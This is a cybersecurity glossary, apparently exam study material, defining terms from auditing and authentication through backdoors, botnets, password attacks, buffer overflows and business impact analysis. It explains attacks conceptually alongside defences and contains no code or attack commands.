Auditing is an essential part of vulnerability management. Where product audits focus on specific features, such as application code, system/process audits interrogate the wider use and deployment of products, including supply chain, configuration, support, monitoring, and cybersecurity. Security audits assess an organization's security controls, policies, and procedures, often using standards like ISO 27001 or the NIST Cybersecurity Framework as benchmarks. These audits can identify technical vulnerabilities and operational weaknesses impacting an organization's security posture.

Cybersecurity audits are comprehensive reviews designed to ensure an organization's security posture aligns with established standards and best practices. There are various types of cybersecurity audits, including compliance audits, which assess adherence to regulations like GDPR or HIPAA; risk-based audits, which identify potential threats and vulnerabilities in an organization's systems and processes; and technical audits, which delve into the specifics of the organization's IT infrastructure, examining areas like network security, access controls, and data protection measures.

Penetration testing fits into cybersecurity audit practices as a critical component of a technical audit as it provides a practical assessment of the organization's defenses by simulating real-world attack scenarios. Rather than simply evaluating policies or configurations, penetration tests actively seek exploitable vulnerabilities, providing a clear picture of what an attacker might achieve. The findings from these tests are then used to improve the organization's security controls and mitigate identified risks.

Penetration tests also play an important role in compliance audits, as many regulations require organizations to conduct regular penetration testing as part of their cybersecurity program. For instance, the Payment Card Industry Data Security Standard (PCI DSS - The information security standard for organizations that process credit or bank card payments) mandates annual and proactive penetration tests for organizations handling cardholder data.
Authentication (AAA) - A method of validating a particular entity's or individual's unique credentials. It is proving that a subject is who or what it claims to be when it attempts to access the resource. An authentication factor determines what sort of credential the subject can use. For example, people might be authenticated by providing a password; a computer system could be authenticated using a token such as a digital certificate.
Authentication Design - Authentication design refers to selecting a technology that meets requirements for confidentiality, integrity, and availability.

Authentication is performed when a supplicant or claimant presents credentials to an authentication server. The server compares what was presented to the copy of the credentials it has stored. If they match, the account is authenticated. Authentication design refers to selecting a technology that meets requirements for confidentiality, integrity, and availability:

1. Confidentiality, in terms of authentication, is critical, because if account credentials are leaked, threat actors can impersonate the account holder and act on the system with whatever rights they have.

2. Integrity means that the authentication mechanism is reliable and not easy for threat actors to bypass or trick with counterfeit credentials.

3. Availability means that the time taken to authenticate does not impede workflows and is easy enough for users to operate.

There are many different technologies for defining credentials. These can be categorized as factors. The longest-standing authentication factor is "Something You Know" or a knowledge factor.

The typical knowledge factor is the login, composed of a username and a password. The username is typically not a secret (although it should not be published openly), but the password must be known only to the account holder. A passphrase is a longer password composed of several words. This has the advantages of being more secure and easier to remember.

A personal identification number (PIN) is also something you know. Originally, PINs were associated with short four- or six-digit numeric sequences used with bank cards. In modern authentication designs, the main characteristic of a PIN is that it is valid for authenticating to a single device only. This type of PIN can use any characters and length.
Authentication Factor - In authentication design, different technologies for implementing authentication, such as knowledge, ownership/token, and biometric/inherence. These are characterized as something you know/have/are.
Authentication Header (AH) - IPSec protocol that provides authentication for the origin of transmitted data as well as integrity and protection against replay attacks. Performs a cryptographic hash on the whole packet, including the IP header, plus a shared secret key (known only to the communicating hosts), and adds this value in its header as an Integrity Check Value (ICV). The recipient performs the same function on the packet and key and should derive the same value to confirm that the packet has not been modified. The payload is not encrypted so this protocol does not provide confidentiality.
Authentication Methods - Technologies and techniques used to verify the identity of users, including knowledge-based, ownership-based, and biometric factors.
Authentication Protocols - Standards and systems for performing authentication across networks and platforms, including local, network, and remote authentication mechanisms.
Authentication, Authorization, and Accounting (AAA) - A security concept where a centralized platform verifies subject identification, ensures the subject is assigned relevant permissions, and then logs these actions to create an audit trail. The servers and protocols that implement these functions can also be referred to as authentication, authorization, and accounting (AAA). The use of IAM to describe enterprise security workflows is becoming more prevalent as the importance of the identification process is better acknowledged.
Authorization (AAA) - The process of determining what rights and privileges a particular entity has. It is determining what rights subjects should have on each resource, and enforcing those rights. An authorization model determines how these rights are granted. For example, in a discretionary model, the object owner can allocate rights. In a mandatory model, rights are predetermined by system-enforced rules and cannot be changed by any user within the system.
Authorized Hacker - A hacker engaged in authorized penetration testing or other security consultancy.
Automation and Orchestration Implementation - Benefits of Automation and Orchestration in Security Operations
Automation and orchestration also offer many important benefits to security operations. Primarily, they enhance efficiency by enabling repetitive tasks to be performed quickly and consistently, reducing the burden on security teams and minimizing the likelihood of human error (sometimes referred to as a workforce multiplier which is a tool or automation that increases employee productivity, enabling them to perform more tasks to the same standard per unit of time).

Operator fatigue refers to the mental exhaustion experienced by cybersecurity professionals due to their work's continuous, high-intensity nature. Security analysts must monitor numerous systems for potential threats, manage high volumes of alerts (including many false positives), and respond to confirmed threats as quickly as possible. These working conditions often lead to long hours, anxiety, and elevated stress levels, resulting in operator fatigue. This fatigue is a significant concern in cybersecurity because it can lead to decreased alertness and cognitive function and impair the ability of security personnel to identify and respond to threats effectively. Fatigue results in missed critical alerts, slower response times, and a greater likelihood of errors, any of which can compromise security.

Automation and orchestration play crucial roles in combating operator fatigue in security operations by minimizing the repetitive, manual tasks that often contribute to operator fatigue. Automation and orchestration significantly reduce a security team's workload by automating routine tasks, such as scanning for vulnerabilities, applying patches, or monitoring systems for anomalous activities. This allows for the more efficient use of resources and frees up security personnel to focus on more complex, strategic issues that require human judgment and creativity rather than repetitive tasks. Orchestration enhances the impact of automation by coordinating automated tasks across different systems and software tools and reduces detection and reaction times (The elapsed time between an incident occurring and a response being implemented).

For example, if a threat is detected, an orchestrated system can automatically isolate the affected subnet, perform basic analysis and reporting, notify security teams, generate tickets, and document the incident, all without human intervention. Other benefits of automation include enforcing standardized baselines through configuration management tools to automatically override unauthorized changes made to endpoints. A standard baseline in configuration management is a well-defined set of approved configurations and settings that serve as a reference point for establishing and maintaining the desired state of a system. Automation and orchestration can significantly alleviate operator fatigue by reducing the volume of manual, routine tasks and improving the efficiency of security operations leading to greater job satisfaction, increased alertness and effectiveness in threat detection and response, and ultimately, more robust security operations.

Automation can support staff retention initiatives by reducing fatigue from repetitive tasks. Automation practices can free staff to perform more rewarding work and increase job satisfaction.

Important Considerations
While automation and orchestration provide numerous benefits, they also present some significant challenges, some of which are listed below:

1. Complexity - Implementing automation and orchestration requires a deep understanding of an organization's systems, processes, and interdependencies. A poorly planned or executed automation strategy can add complexity, making systems more difficult to manage and maintain.

2. Cost - The initial cost of implementing automation and orchestration can be high, including costs associated with acquiring and developing appropriate tools, integrating them into existing systems, and training staff to use them effectively. Automation software maintenance and upgrades can also be costly.

3. Single Point of Failure - A component or system that would cause a complete interruption of a service if it failed. If a critical automated system or process fails, it could impact multiple areas of the organization, causing widespread problems.

4. Technical Debt - Costs accrued by keeping an ineffective system or product in place, rather than replacing it with a better-engineered one. Organizations can accrue technical debt if automation and orchestration tools are implemented hastily, resulting in poorly documented code, "brittle" system integrations, or poor maintenance. Over time, this debt can lead to system instability, complexity, and increased costs, ironically similar to the problems associated mainly with legacy systems.

5. Ongoing Support - Automation and orchestration systems require ongoing support to stay effective and secure, including updates and patches, reviewing and improving automated processes, and continuous education. Without adequate support, the benefits of automation and orchestration are quickly eroded.

Maintaining system security when new hardware or infrastructure items are added to the network can be achieved by enforcing standard configurations (In an IaC architecture, the property that an automation or orchestration action always produces the same result, regardless of the component's previous state) across the company. With automated configurations, these newly added items can be kept up to date and secure.

Benefits of Infrastructure Management Automation
Automating and orchestrating infrastructure configurations introduces numerous benefits. Enforcing standardized configurations ensures consistency and accuracy throughout the infrastructure. Automation saves time and resources by allowing configurations to be quickly deployed, and it also enhances scalability and flexibility by simplifying the deployment and configuration of new resources.

Furthermore, automation and orchestration improve standardization, compliance, and change management by enforcing predefined configuration standards, making auditing and change tracking easier, and controlling configuration drift. Additionally, automation can strengthen security and governance by enforcing security controls, applying patches consistently, and automating security-related tasks.
Automation and Scripting - Automation and scripting have emerged as critical tools in modern IT operations, helping organizations streamline processes, enhance security, and improve efficiency. Automation serves as a tool to enhance both security governance and change management. In terms of governance, automation can help enforce security policies more consistently and efficiently, and it can aid in monitoring and reporting to provide valuable insights for leadership teams and risk managers. In change management, automation can reduce the risk of human error, reduce implementation time, and provide clear audit trails. For example, scripts are effective for applying patches and updates across an organization's systems uniformly, and automation tools can track these changes for later review.

Capabilities:

1. Provisioning - User and resource provisioning are fundamental IT tasks that greatly benefit from automation and scripting. User provisioning describes creating, modifying, or deleting user accounts and access rights across IT systems. Resource provisioning describes allocating IT resources such as servers, storage, and networks to applications and users. Automation can improve these tasks, reduce manual effort, minimize errors, and improve turnaround time. Scripting these tasks helps organizations provide consistent implementation and improve compliance.

2. Guardrails and Security Groups - Guardrails and security groups provide frameworks for managing security within an organization. Automated guardrails can monitor and enforce compliance with security policies, ensuring that risky activities and behavior are prevented or flagged for review. Security groups define which resources a user or system can access. Security groups can also be managed more efficiently through automation, reducing the possibility of unauthorized access or excessive permissions.

3. Ticketing - Automation can significantly improve the efficiency of ticketing platforms. Incidents detected by monitoring systems can automatically generate support tickets, and automation can also route tickets based on predefined criteria, ensuring they reach the right team or individual for resolution. Automated escalation procedures can also ensure that critical issues receive immediate attention. Examples include high-impact incidents, incidents requiring specialized teams, incidents involving executives and important customers, or any issue that risks violating an established SLA.

4. Service Management - Automation and scripting are also essential tools for managing services and access within an IT environment. Security analysts can automate routine tasks such as enabling or disabling services, modifying access rights, and maintaining the lifecycle of IT resources, freeing up time to focus on more strategic or complicated analytical tasks.

5. Continuous Integration and Testing - The principles of continuous integration and testing hinge heavily on automation. In this approach, developers regularly merge their changes back to the main code branch, and each merge is tested automatically to help detect and even fix integration problems. This capability improves code quality, accelerates development cycles, and reduces the risk of integration issues.

6. Application Programming Interfaces (APIs) - APIs enable different software systems to communicate and interact, and automation can orchestrate these interactions, creating seamless workflows and facilitating the development of more complex systems, such as security orchestration, automation and response (SOAR) platforms.
Availability - The fundamental security goal of ensuring that computer systems operate continuously and that authorized persons can access data that they need. Availability means that information is readily accessible to those authorized to view or modify it.
Availability (Authentication) - It means that the time taken to authenticate does not impede workflows and is easy enough for users to operate.
Backdoor - A mechanism for gaining access to a computer that bypasses or subverts the normal method of authentication.
Backdoors and Remote Access Trojans (RAT) - Any type of access method to a host that circumvents the usual authentication method and gives the remote user administrative control can be referred to as a backdoor (A mechanism for gaining access to a computer that bypasses or subverts the normal method of authentication). A remote access Trojan (RAT - Malware that creates a backdoor remote administration channel to allow a threat actor to access and control the infected host) is backdoor malware that mimics the functionality of legitimate remote control programs, but is designed specifically to operate covertly. Once the RAT is installed, it allows the threat actor to access the host, upload files, and install software or use "live off the land" techniques to effect further compromises.

In this context, RAT can also stand for remote administration tool. A host that is under malicious control is sometimes described as a zombie.

A compromised host can be installed with one or more bots. A bot is an automated script or tool that performs some malicious activity. A group of bots that are all under the control of the same malware instance can be manipulated as a botnet (A group of hosts or devices that has been infected by a control program called a bot, which enables attackers to exploit the hosts to mount attacks) by the herder program. A botnet can be used for many types of malicious purpose, including triggering distributed denial of service (DDoS) attacks, launching spam campaigns, or performing cryptomining.

Whether a backdoor is used as a standalone intrusion mechanism or to manage bots, the threat actor must establish a connection from the compromised host to a command and control (C2 or C&C - Infrastructure of hosts and services with which attackers direct, distribute, and control malware over botnets) host or network. This network connection is usually the best way to identify the presence of a RAT, backdoor, or bot. There are many means of implementing a C&C network as a covert channel (A type of attack that subverts network security systems and policies to transfer data without authorization or detection) to evade detection and filtering. Historically, the Internet Relay Chat (IRC - A group communications protocol that enables users to chat, send private messages, and share files) protocol was popular. Modern methods are more likely to use command sequences embedded in HTTPS or DNS traffic.

Backdoors can be created in other ways than by infection by malware. Programmers may create backdoors in software applications for testing and development that are subsequently not removed when the application is deployed. Backdoors are also created by misconfiguration of software or hardware that allows access to unauthorized users.
Backout Plans (Change Management) - A backout plan is a contingency plan for reversing changes and returning systems and software to their original state if the implementation plan fails. A well-defined backout plan helps to minimize downtime and reduces the risk of data loss or other severe impacts.
Backup Power Generator - A standby power supply fueled by diesel or propane. In the event of a power outage, a UPS must provide transitionary power, as a backup generator cannot be cut in fast enough.
Baseline configuration - A baseline configuration is a list of settings that an asset, such as a server or application, must adhere to. Security baselines describe the minimum set of security configuration settings a device or software must maintain to be considered adequately protected.
Beacon - A beacon is a single pixel image embedded into a website. While invisible to the user, the browser must make a request to download the pixel to load the site, giving the beacon host the opportunity to collect metadata, perform browser fingerprinting, and potentially run tracking scripts.
Behavioral-based Detection - A network monitoring system that detects changes in normal operating data sequences and identifies abnormal sequences.

Behavioral-based detection means the engine is trained to recognize baseline "normal" traffic or events. Anything that deviates from this baseline (outside a defined level of tolerance) generates an incident. The software will be able to identify zero-day attacks, insider threats, and other malicious activity for which there is no single signature.
Benchmarks - One of the functions of a vulnerability scan is to assess the configuration of security controls and application settings and permissions compared to established benchmarks.

The scanner might try to identify whether there is a lack of controls that might be considered necessary or whether there is any misconfiguration of the system that would make the controls less effective or ineffective, such as antivirus software not being updated, or management passwords left configured to the default. This sort of testing requires specific information about best practices in configuring the particular application or security control. These best practices are provided by listing the controls and appropriate configuration settings in a template.

Security Content Automation Protocol (SCAP) allows compatible scanners to determine whether a computer meets a configuration baseline. SCAP uses several components to accomplish this function, but some of the most important are the following:

1. Open Vulnerability and Assessment Language (OVAL) - An XML schema for describing system security state and querying vulnerability reports and information.

2. Extensible Configuration Checklist Description Format (XCCDF) - An XML schema for developing and auditing best practice configuration checklists and rules. Previously, best practice guides might have been written in prose for systems administrators to apply manually. XCCDF provides a machine-readable format that can be applied and validated using compatible software.

Some scanners measure systems and configuration settings against best practice frameworks. This is referred to as a compliance scan. This might be necessary for regulatory compliance, or you might voluntarily want to conform to externally agreed upon standards of best practice.
Benchmarks and Secure Configuration Guides - A secure baseline (Configuration guides, benchmarks, and best practices for deploying and maintaining a network device or application server in a secure state for its given role) is a collection of standard configurations and settings for network devices, software, patching and updates, access controls, logging, monitoring, password policies, encryption, endpoint protection, and many others. Secure baselines improve information technology security, manageability, and operational efficiencies by establishing consistent and centralized rules and procedures regarding configuring and securing the environment.

The Center for Internet Security (CIS) Benchmarks are an important resource for secure configuration best practices. CIS is recognized globally for publishing and maintaining best practice guides for securing IT systems and data. CIS Benchmarks cover multiple domains, such as networks, operating systems, and applications, and are updated continuously in response to evolving risks. For example, there are benchmarks for compliance with IT frameworks and compliance programs, such as PCI DSS, NIST 800-53, SOX, and ISO 27000. There are also product-focused benchmarks, such as for Windows Desktop, Windows Server, macOS, Linux, Cisco, web browsers, web servers, database and email servers, and VMware ESXi. Security Technical Implementation Guides (STIGs) are a specific secure baseline developed by the Defense Information Systems Agency (DISA) for the US Department of Defense. Like CIS Benchmarks, STIGs define a standardized set of security configurations and controls specifically designed for the DoD's IT infrastructure.

Several tools and technologies are available to help manage, deploy, and measure compliance with established secure baselines. Configuration management tools, such as Puppet, Chef, Ansible, and Microsoft's Group Policy, allow organizations to automate the deployment of secure baseline configurations across various diverse systems. These tools help enforce consistency and detect and correct deviations from the established baseline. For monitoring compliance, Security Content Automation Protocol (SCAP) compliant tools, like OpenSCAP, can assess and verify the system's adherence to the baseline. Furthermore, the CIS provides the CIS-CAT Pro tool, designed to assess system configurations against CIS's secure baseline benchmarks. The SCAP Compliance Checker (SCC) is a tool maintained by the DISA used to measure compliance with STIG baselines.

Hardening Concepts
Network equipment, software, and operating systems use default settings from the developer or manufacturer which attempt to balance ease of use with security. Default configurations are an attractive target for attackers as they usually include well-documented credentials, allow simple passwords, use insecure protocols, and many other problematic settings. By leaving these default settings in place, organizations increase the likelihood of successful cyberattacks. Therefore, it's crucial to change these default settings to improve security.

Hardening describes (A process of making a host or app configuration secure by reducing its attack surface, through running only necessary services, installing monitoring software to protect against malware and intrusions, and establishing a maintenance schedule to ensure the system is patched to be secure against software exploits) the methods to improve a device's security by changing its default configuration, often by implementing the recommendations in published secure baselines.

Switches and Routers
Examples of changes designed to improve the security of switches and routers from the default settings include the following:

1. Change Default Credentials -  That are well documented and pose a significant security risk.

2. Disable Unnecessary Services and Interfaces - On a switch or router. Not every service or interface is needed. For example, services like HTTP or Telnet should be avoided.

3. Use Secure Management Protocols - Such as SSH instead of Telnet or HTTPS instead of HTTP.

4. Implement Access Control Lists (ACLs) - To restrict access to the router or switch to only required devices and networks.

5. Enable Logging and Monitoring - To help identify issues like repeated login failures, configuration changes, and many others.

6. Configure Port Security - Helps limit the devices that can connect to a switch port to prevent unauthorized access.

7. Strong Password Policies - Help reduce the risk of password attacks.

8. Physically Secure Equipment - Like keeping devices in a locked room to prevent unauthorized physical access.

Server Hardware and Operating Systems
Examples of changes designed to improve the security of servers from the default settings include the following:

1. Change Default Credentials - To prevent unauthorized access, similar to network devices.

2. Disable Unnecessary Services - To reduce the attack surface of the server. Each service running on a server represents a potential point of entry for an attacker.

3. Apply Software Security Patches and Updates Regularly -  to fix known vulnerabilities and provide security improvements. Automated patch management ensures this process is consistent and timely.

4. Least Privilege Principle - Limits each user to the least amount of privilege necessary to perform a function to reduce the impact of a compromised account.

5. Use Firewalls and Intrusion Detection Systems (IDS) - To help block or alert on malicious activity.

6. Secure Configuration - Servers should use baseline configurations such as those provided by the CIS or STIGs.

7. Strong Access Controls - Include strong password policies, multifactor authentication (MFA), and privileged access management (PAM).

8. Enable Logging and Monitoring - To help identify issues like repeated login failures, configuration changes, and many others similar to the benefits for network equipment.

9. Use Antivirus and Antimalware Solutions - To detect and quarantine malware automatically.

10. Physical Security - Security of server equipment racks, server rooms, or datacenters prevents unauthorized access.
Biometric Authentication - An authentication mechanism that allows a user to perform a biometric scan to operate an entry or access system. Physical characteristics stored as a digital data template can be used to authenticate a user. Typical features used include facial pattern, iris, retina, fingerprint pattern, and signature recognition.

The first step in setting up biometric authentication is enrollment:

1. A sensor module acquires the biometric sample from the target.

2. A feature extraction module creates a template. The template is a mathematical representation of the parts of the sample that uniquely identify the target.

When the user wants to access a resource, they are re-scanned, and the scan is compared to the template. If they match to within a defined degree of tolerance, access is granted.

Fingerprint recognition is the most widely implemented biometric authentication method. The technology required for scanning and recording fingerprints is relatively inexpensive and the process quite straightforward. A fingerprint sensor is usually implemented as a small capacitive cell or optical camera that can detect the unique pattern of ridges making up the pattern. The technology is also nonintrusive and relatively simple to use, although moisture or dirt can prevent readings.

Facial recognition records multiple indicators about the size and shape of the face like the distance between the eyes or the width and length of the nose. The scan usually uses optical and infrared cameras or sensors to defeat spoofing attempts that substitute a photo for a real face.
Birthday Attack - A type of password attack that exploits weaknesses in the mathematical algorithms used to encrypt passwords, in order to take advantage of the probability of different password inputs producing the same encrypted output.

A collision attack depends on being able to create a malicious document that outputs the same hash as the benign document. Some collision attacks depend on being able to manipulate the way the hash is generated. A birthday attack is a means of exploiting collisions in hash functions through brute force. Brute force means attempting every possible combination until a successful one is achieved. The attack is named after the birthday paradox. This paradox shows that the computational time required to brute force a collision might be less than expected.

The birthday paradox asks how large must a group of people be so that the chance of two of them sharing a birthday is 50%. The answer is 23, but people who are not aware of the paradox often answer around 180 (365/2). The point is that the chances of someone sharing a particular birthday are small, but the chances of any two people in a group sharing any birth date in a calendar year get better and better as you add more people: 1 – (365 * (365 − 1) * (365 – 2) ... * (365 – ( N − 1)/365 N ) .

To exploit the paradox, the attacker creates multiple malicious and benign documents, both featuring minor changes (punctuation, extra spaces, and so on). Depending on the length of the hash and the limits to the non-suspicious changes that can be introduced, if the attacker can generate sufficient variations, then the chance of matching hash outputs can be better than 50%. This effectively means that a hash function that outputs 128-bit hashes can be attacked by a mechanism that can generate 2 64 variations. Computing 2 64 variations will take much less time than computing 2 128 variations.

Attacks that exploit collisions are difficult to launch, but the principle behind the attack informs the need to use authentication methods that use both strong ciphers and strong protocol and software implementations.
Blackmail - Demanding payment to prevent the release of information. Blackmail is demanding payment to prevent the release of information. A threat actor might have stolen information or created false data that makes it appear as though the target has committed a crime.
Block List - A security configuration where access is generally permitted to a software process, IP/domain, or other subject unless it is listed as explicitly prohibited.
Blockchain - A concept in which an expanding list of transactional records listed in a public ledger is secured using cryptography.

Blockchain is a concept in which an expanding list of transactional records is secured using cryptography. Each record is referred to as a block and is run through a hash function. The hash value of the previous block in the chain is added to the hash calculation of the next block in the chain. This ensures that each successive block is cryptographically linked. Each block validates the hash of the previous block all the way through to the beginning of the chain, ensuring that each historical transaction has not been tampered with. In addition, each block typically includes a time stamp of one or more transactions as well as the data involved in the transactions themselves.

The blockchain is recorded in an open public ledger. This ledger does not exist as an individual file on a single computer; rather, one of the most important characteristics of a blockchain is that it is decentralized. The ledger is distributed across a peer-to-peer (P2P) network in order to mitigate the risks associated with having a single point of failure or compromise. Blockchain users can therefore trust each other equally. Likewise, another defining quality of a blockchain is its openness—everyone has the same ability to view every transaction on a blockchain.

Blockchain technology has a variety of potential applications. It can ensure the integrity and transparency of financial transactions, legal contracts, copyright and intellectual property (IP) protection, online voting systems, identity management systems, and data storage.
Blocked Content - A potential indicator of malicious activity where audit logs show unauthorized attempts to read or copy a file or other data.
Bluejacking - Sending an unsolicited message or picture message using a Bluetooth connection.
Bluesnarfing - A wireless attack where an attacker gains access to unauthorized information on a device using a Bluetooth connection.
Bluetooth - Short-range, wireless radio-network-transmission medium normally used to connect two personal devices, such as a mobile phone and a wireless headset.
Bluetooth Network (Network Vector) - The threat actor exploits a vulnerability or misconfiguration to transmit a malicious file to a user's device over the Bluetooth personal area wireless networking protocol.
Bollards - Sturdy vertical post installed to control road traffic or designed to prevent ram-raiding and vehicle-ramming attacks. Bollards are generally short vertical posts made of steel, concrete, or other similarly durable materials and installed at intervals around a perimeter or entrance. Sometimes bollards are nonobvious and appear as sculptures or as building design elements. They can be fixed or retractable, and some models can be raised or lowered remotely. Bollards can serve several purposes, such as protecting pedestrians from vehicular traffic, preventing unauthorized vehicle access, and providing perimeter security for critical infrastructure and facilities. They are often used to secure government buildings, airports, stadiums, store entrances, and other public spaces. By preventing vehicles from entering restricted areas, bollards can help mitigate the risks of vehicular attacks and accidents.
Botnet - A group of hosts or devices that has been infected by a control program called a bot, which enables attackers to exploit the hosts to mount attacks.

A compromised host can be installed with one or more bots. A bot is an automated script or tool that performs some malicious activity. A group of bots that are all under the control of the same malware instance can be manipulated as a botnet by the herder program. A botnet can be used for many types of malicious purpose, including triggering distributed denial of service (DDoS) attacks, launching spam campaigns, or performing cryptomining.
Brand Impersonation - Brand impersonation means the threat actor commits resources to accurately duplicate a company's logos and formatting (fonts, colors, and heading/body paragraph styles) to make a phishing message or pharming website, a visually compelling fake. The threat actor could even mimic the style or tone of email communications or website copy. They could try to get a phishing site listed high in search results by using realistic content.
Bring Your Own Device (BYOD) - Security framework and tools to facilitate use of personally owned devices to access corporate networks and data.
Brute Force Attack (Physical) - A brute force physical attack can take several different forms, some examples of which are the following:

1. Smashing a hardware device to perform physical denial of service (DoS).

2. Breaking into premises or cabinets by forcing a lock or gateway. This is likely to be an indicator of theft or tampering.

Preventing theft is often impossible to guarantee, so knowing that something has been stolen is important for things like data breach reporting and revoking access permissions. A system that is tamper-evident will display visible signs of forced entry or use that are difficult for a threat actor to disguise.
Brute Force Password Attack - A type of password attack where an attacker uses an application to exhaustively try every possible alphanumeric combination to crack encrypted passwords.

A brute force attack attempts every possible combination in the output space to try to match a captured hash and derive the plaintext that generated it. The output space is determined by the number of bits used by the algorithm (128-bit MD5 or 256-bit SHA256, for instance). The larger the output space and the more characters that were used in the plaintext password, the more difficult it is to compute and test each possible hash to find a match. Brute force attacks are heavily constrained by time and computing resources, and are therefore most effective at cracking short passwords. However, brute force attacks distributed across multiple hardware components, like a cluster of high-end graphics cards, can be successful at cracking longer passwords.
Buffer Overflow - An attack in which data goes past the boundary of the destination buffer and begins to corrupt adjacent memory. This can allow the attacker to crash the system or execute arbitrary code.

A buffer is an area of memory that the application reserves to store expected data. To exploit a buffer overflow vulnerability, the attacker passes data that deliberately overfills the buffer. One of the most common vulnerabilities is a stack overflow. The stack is an area of memory used by a program subroutine. It includes a return address, which is the location of the program that called the subroutine. An attacker could use a buffer overflow to change the return address, allowing the attacker to run arbitrary code on the system.

Buffer overflow attacks are mitigated on modern hardware and operating systems via address space layout randomization (ASLR) and Data Execution Prevention (DEP) controls, utilizing type-safe programming languages (A program that enforces strict type-checking during compilation and ensures variables and data are used correctly. It prevents memory-related vulnerabilities and injection attacks) and incorporating secure coding practices.
Bug Bounty - Reward scheme operated by software and web services vendors for reporting vulnerabilities.

Bug bounty programs are another proactive strategy and describe when organizations incentivize discovering and reporting vulnerabilities by offering rewards to external security researchers or "white hat" hackers. Both penetration testing and bug bounty programs are proactive cybersecurity practices to identify and mitigate vulnerabilities in a system or application. They both involve exploiting vulnerabilities to understand their potential impact, with the difference lying primarily in who conducts the testing and how it's structured. Penetration testing is typically performed by a hired team of professional ethical hackers within a confined time frame, using a structured approach based on the organization's requirements. This approach allows for a focused, in-depth examination of specific systems or applications and provides a predictable cost and timeline.

In contrast, bug bounty programs open the testing process to a global community of independent security researchers. Rewards for finding and reporting vulnerabilities incentivize these researchers. This approach can bring diverse skills and perspectives to the testing process, potentially uncovering more complex or obscure vulnerabilities.

An organization may choose penetration testing for a more controlled, targeted assessment, especially when testing specific components or meeting certain compliance requirements. A bug bounty program might be preferred when seeking a more extensive range of testing, leveraging the collective skills of a global community. However, many organizations see the value in both and use a combination of pen testing and bug bounty programs to ensure comprehensive vulnerability management.
Business Continuity - A collection of processes that enable an organization to maintain normal business operations in the face of some adverse event.
Business Continuity Documentation - Business continuity documentation practices cover planning, implementation, and evaluation. Documentation supports the testing process. Documentation includes test plans outlining the objectives, scope, and methods of tests and the roles and responsibilities of individuals involved. Test scripts (or scenarios) provide step-by-step instructions for performing the tests, and test results identify strengths and weaknesses of the business continuity plan and the technical capabilities supporting it. Documentation is the foundation for clear communication and reporting of activities. It provides a common reference point for those involved in business continuity testing and facilitates effective communication with management, executive teams, and other relevant stakeholders. Third-party assessments and certifications offer an objective and independent evaluation of an organization's testing practices. Third-party assessments and certifications offer objective evaluation, compliance verification, validation of testing effectiveness, industry recognition, and recommendations for continuous improvement. Examples of third-party evaluations include assessments performed in alignment with ISO 22301, PCI DSS, and SOC 2.
Business Email Compromise - An impersonation attack in which the attacker gains control of an employee's account and uses it to convince other employees to perform fraudulent actions. Where phishing is typically associated with mass mailer attacks, business email compromise refers to a sophisticated campaign that targets a specific individual within a company, typically an executive or senior manager. The threat actor poses as a colleague, business partner, or vendor. The threat actor is likely to perform reconnaissance to obtain a detailed understanding of the target and the best psychological approach and pretexts to trick them. They are unlikely to use obvious features of mass mailer phishing messages such as spoofed links or malware file attachments.  To perpetrate this type of high-stakes attack, the threat actor might try to first gain control of a legitimate mail account to use to send the phishing messages. Some sources use the term "business email compromise" to mean an attack with a specific financial motivation, where the objective is to persuade a budget holder to authorize a fraudulent payment or wire transfer. Similar terminology for highly targeted attacks includes spear phishing (targeting specific individuals), whaling (targeting employees that have influential roles), CEO fraud (impersonating the CEO), and angler phishing (using social media as the vector).
Business Impact Analysis (BIA) - Systematic activity that identifies organizational risks and determines their effect on ongoing, mission critical operations.

Identification of Critical Systems
To support the resiliency of mission essential and primary business functions, it is crucial to perform an identification of critical systems. This means compiling an inventory of business processes and the assets that support them. Asset types include the following:

1. People (employees, visitors, and suppliers).

2. Tangible assets (buildings, furniture, equipment and machinery (plant), Information and Communication Technology (ICT) equipment, electronic data files, and paper documents).

3. Intangible assets (ideas, commercial reputation, brand, and so on).

4. Procedures (supply chains, critical procedures, standard operating procedures).

For mission essential functions, it is important to reduce the number of dependencies between components. Dependencies are identified by performing a business process analysis (BPA) for each function. The BPA should identify the following factors:

1. Inputs - The sources of information for performing the function (including the impact if these are delayed or out of sequence).

2. Hardware - The particular server or datacenter that performs the processing.

3. Enablers - Staff and other resources supporting the function.

4. Outputs - The data or resources produced by the function.

5. Process Flow - A step-by-step description of how the function is performed.

Business Impact Analysis (BIA) is a process that helps businesses understand the potential effects of disruptions on their operations. It involves identifying and assessing the impact of various unplanned threat scenarios on the business, such as accidents, emergencies, and disasters. By conducting a BIA, businesses can proactively create recovery strategies to minimize the impact of disruptions and ensure operational resilience.

For instance, if a DDoS attack suspends an e-commerce portal for five hours, the business impact analysis will be able to quantify the losses from orders not made and customers moving permanently to other suppliers based on historic data. The likelihood of a DoS attack can be assessed on an annualized basis to determine annualized impact in terms of costs. This information is used to assess whether a security control, such as load balancing or managed DDoS mitigation, is worth the investment.

Mission Essential Functions
Business or organizational activity that is too critical to be deferred for anything more than a few hours, if at all.

A mission essential function (MEF) is one that cannot be deferred. This means that the organization must be able to perform the function as close to continually as possible, and if there is any service disruption, the mission essential functions must be restored first.

Functions that act as support for the business or an MEF, but are not critical in themselves, are referred to as primary business functions (PBF).

Analysis of mission essential functions is generally governed by four main metrics:

1. Maximum Tolerable Downtime (MTD) - It is the longest period of time that a business function outage may occur for without causing irrecoverable business failure. Each business process can have its own MTD, such as a range of minutes to hours for critical functions, 24 hours for urgent functions, seven days for normal functions, and so on. MTDs vary by company and event. Each function may be supported by multiple systems and assets. The MTD sets the upper limit on the amount of recovery time that system and asset owners have to resume operations. For example, an organization specializing in medical equipment may be able to exist without incoming manufacturing supplies for three months because it has stockpiled a sizable inventory. After three months, the organization will not have sufficient supplies and may not be able to manufacture additional products, therefore leading to failure. In this case, the MTD is three months.

2. Recovery time objective (RTO) - It is the period following a disaster that an individual IT system may remain offline. This represents the amount of time it takes to identify that there is a problem and then perform recovery (restore from backup or switch to an alternative system, for instance).

3. Work Recovery Time (WRT) - Following systems recovery, there may be additional work to reintegrate different systems, test overall functionality, and brief system users on any changes or different working practices so that the business function is again fully supported.
RTO+WRT must not exceed MTD!

4. Recovery point objective (RPO) - It is the amount of data loss that a system can sustain, measured in time. That is, if a database is destroyed by a virus, an RPO of 24 hours means that the data can be recovered (from a backup copy) to a point not more than 24 hours before the database was infected. RPO is determined by identifying the maximum acceptable data loss an organization can tolerate in the event of a disaster or system failure and is established by considering factors such as business requirements, data criticality, and regulatory or contractual obligations. The calculation of RPO directly impacts the frequency of data backups, data replication requirements, recovery site selection, and technologies that support failover and high availability.

